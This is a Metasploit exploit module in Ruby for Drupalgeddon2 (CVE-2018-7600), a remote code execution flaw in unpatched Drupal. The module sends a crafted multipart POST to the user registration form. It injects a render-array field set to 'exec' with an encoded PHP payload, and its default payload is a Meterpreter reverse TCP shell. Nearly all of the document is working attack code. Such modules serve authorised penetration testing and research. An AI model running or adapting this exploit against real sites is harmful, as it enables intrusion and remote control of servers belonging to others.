##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
  
    include Msf::Exploit::Remote::HttpClient
  
    def initialize(info={})
      super(update_info(info,
        'Name'           => 'Drupalgeddon2',
        'Description'    => %q{
          CVE-2018-7600 / SA-CORE-2018-002
          Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1
          allows remote attackers to execute arbitrary code because of an issue affecting
          multiple subsystems with default or common module configurations.

          The module can load msf PHP arch payloads, using the php/base64 encoder.

          The resulting RCE on Drupal looks like this: php -r 'eval(base64_decode(#{PAYLOAD}));'
        },
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'Vitalii Rudnykh',      # initial PoC
            'Hans Topo',            # further research and ruby port
            'José Ignacio Rojo'     # further research and msf module
          ],
        'References'     =>
          [
            ['SA-CORE', '2018-002'],
            ['CVE', '2018-7600'],
          ],
        'DefaultOptions'  =>
        {
          'encoder' => 'php/base64',
          'payload' => 'php/meterpreter/reverse_tcp',
        },
        'Privileged'     => false,
        'Platform'       => ['php'],
        'Arch'           => [ARCH_PHP],
        'Targets'        =>
          [
            ['User register form with exec', {}],
          ],
        'DisclosureDate' => 'Apr 15 2018',
        'DefaultTarget'  => 0
      ))
  
      register_options(
        [
          OptString.new('TARGETURI', [ true, "The target URI of the Drupal installation", '/']),
        ])
  
      register_advanced_options(
        [

        ])
    end
  
    def uri_path
      normalize_uri(target_uri.path)
    end

    def exploit_user_register
      data = Rex::MIME::Message.new
      data.add_part("php -r '#{payload.encoded}'", nil, nil, 'form-data; name="mail[#markup]"')
      data.add_part('markup', nil, nil, 'form-data; name="mail[#type]"')
      data.add_part('user_register_form', nil, nil, 'form-data; name="form_id"')
      data.add_part('1', nil, nil, 'form-data; name="_drupal_ajax"')
      data.add_part('exec', nil, nil, 'form-data; name="mail[#post_render][]"')
      post_data = data.to_s

      # /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
      res = send_request_cgi({
        'method'   => 'POST',
        'uri'      => "#{uri_path}user/register",
        'ctype'    => "multipart/form-data; boundary=#{data.bound}",
        'data'     => post_data,
        'vars_get' => {
          'element_parents' => 'account/mail/#value',
          'ajax_form'       => '1',
          '_wrapper_format' => 'drupal_ajax',
        }
      })

      unless res and res.code == 200
        fail_with(Failure::Unknown, "The target does not seem to be vulnerable. Returned code #{res.code}")
      end
      print_success("The target seems to be vulnerable.")
    end
  
    ##
    # Main
    ##
  
    def exploit
      case datastore['TARGET']
      when 0
        exploit_user_register
      else
        fail_with(Failure::BadConfig, "Invalid target selected.")
      end
    end
  end